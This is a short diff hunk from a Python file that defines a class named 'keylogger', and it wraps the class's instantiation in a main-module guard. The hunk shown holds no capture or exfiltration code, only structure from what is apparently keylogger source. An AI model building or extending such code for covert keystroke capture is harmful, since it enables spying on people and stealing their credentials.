@@ -116,5 +116,6 @@ class keylogger():
             self.file.close()
     def on_release(self,key):
         self.key = b""
-
-keylogger1 = keylogger()
+        
+if __name__ == "__main__":
+    keylogger1 = keylogger()
